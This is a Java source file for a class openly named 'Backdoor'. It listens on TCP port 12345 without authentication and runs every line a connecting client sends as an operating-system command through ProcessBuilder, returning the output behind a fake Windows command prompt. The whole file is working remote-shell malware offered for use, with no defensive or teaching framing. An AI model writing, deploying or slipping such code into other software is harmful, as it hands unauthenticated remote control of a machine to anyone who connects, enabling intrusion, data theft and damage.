/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.javanunes;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

/**
 *
 * @author JavaNunes
 */
public class Backdoor {
    
    private static final String mensagemComandoNaoAchado1="Command not found";
    private static final String mensagemComandoNaoAchado2=" Não é um comando interno ou válido";
    private static final String mensagemComandoNaoAchado3="Access denied";
    private static final String mensagemApresentacao="Backdoor JavaNunes toitois 1.0";
    private static final int porta = 12345;
    
    
    public static String run(String comando, PrintWriter out){
        if(!comando.isEmpty()){
            try{
                ProcessBuilder processBuilder = new ProcessBuilder(comando.split(" "));
                Process process = processBuilder.start(); 
                StringBuilder output = new StringBuilder();
         
                try (BufferedReader reader = new BufferedReader( new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                }
                catch(Exception e){
                    out.println(mensagemComandoNaoAchado1);
                    return mensagemComandoNaoAchado1;
                }
                int exitVal = process.waitFor();
                if (exitVal != 0) {
                    //throw new IOException("Comando não executado com sucesso.");
                    out.println(mensagemComandoNaoAchado1);
                }
                return output.toString();              
            }
            catch(Exception e){
                return mensagemComandoNaoAchado1;
            }
        }
        return mensagemComandoNaoAchado1;
    }
    
    
    public static void looping(boolean ativo){
        if(ativo){   
            try (ServerSocket serverSocket = new ServerSocket(porta)) {
                System.out.println(mensagemApresentacao + " na porta "+ porta);
                while (true) {
                    // Aceita uma nova conexão
                    Socket cliente = serverSocket.accept();
                    System.out.println("Novo cliente conectado: " + cliente.getInetAddress().getHostAddress());
                    // Cria uma nova thread para lidar com o cliente
                    
                    new Thread(() -> {
                        String x = "";
                        try (BufferedReader in = new BufferedReader(new InputStreamReader(cliente.getInputStream()))) {
                            String mensagem;
                            PrintWriter out = new PrintWriter(cliente.getOutputStream(), true);
                            out.println("C:\\WINDOWS\\System32\\>");
                            while ((mensagem = in.readLine()) != null) {
                                System.out.println("Cliente disse: " + mensagem);
                                if(mensagem.equals("sair") || mensagem.equals("exit") || mensagem.equals("quit") ){
                                    in.close();
                                }
                                x = run(mensagem,out);
                                out.println(x);
                                out.println("C:\\WINDOWS\\System32\\>");
                                System.out.println(".");
                            }
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                            System.out.println("Erro 404");
                        } 
                        finally {
                            try {
                                cliente.close();
                            } 
                            catch (IOException e) {
                                e.printStackTrace();
                                System.out.println("Erro 403");
                            }
                        }
                    }).start();
                }
            } 
            catch (IOException e) {
                 System.out.println("Erro 405");
            }
        }
    }
    
    public static void main(String[] args) {
         looping(true);
    }
}